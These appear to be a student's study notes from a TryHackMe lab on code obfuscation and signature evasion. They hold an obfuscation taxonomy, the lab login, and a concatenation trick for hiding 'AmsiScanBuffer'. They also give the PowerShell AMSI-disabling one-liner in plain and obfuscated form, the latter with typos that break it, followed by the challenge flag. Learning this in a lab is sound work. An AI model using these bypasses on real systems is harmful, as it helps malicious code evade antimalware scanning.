-evade modern detection engineering
-understand obfuscation
-implement obfuscation methods

Machine IP,
user: Student
pass: TryHackMe!

-software related fields to protect intellectual property
layers of obfuscation
Software Obfuscation > Code-Element, Software-Component, Inter-Component, Application Layer
Code-Element > 
  Obfuscating Layout >
    >Junk Code
    >Seperation of Related Codes
    >Stripping Redundant Symbols
    >Meaningless Identifiers
  Obfuscating Controls >
    >Implicit Controls
    >Dispatcher-based Controls
    >Probablisitic Control Flows
    >Bogus Control Flows
  Obfuscating Data >
    >Array Transformation -  transforms an array by splitting, merging, folding and flattening
    >Data Encoding - encodes data with mathematical functions or ciphers
    >Data Procedurization - substitutes static data with procedure calls
    >Data Splitting/Merging - distributes info of one var into several new var
  Obfuscating Methods >
    >Method Proxy
    >Method Scattering/Aggregation
    >Method Clone
    >Method Inline/Outline
  Obfuscating Classes >
    >Class Hierarchy flattening
    >Class Splitting/coalescing
    >Dropping Modifiers
Signature Evasion Room    
    
---------------------------------------------------------------------------------------------------------------------------------
    
Concatenation: combining two separate objects into a one object 
-can be used to modify signatures or manipulate other aspects of an application
-eg: static signatures - defined string "AmsiScanBuffer"
IntPtr ASBPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer"); //alerts
IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer"); //no alerts
-non-interpreted characters: used to disrupt or confuse a static signature
-breaks, reorders, whitespace, ticks, Random case

challenge: obfuscate .ps1 code snippet using concatination and upload into the webserver to get the flag
original: [Ref].Assmebly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
obfuscated: $Value="SetValue" [Ref}.Assmebly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic).$Value($null,$true)
THM{koNC473n473_4LI_7H3_7H1n95}

------------------------------------------------------------------------------------------------------------------------------------------

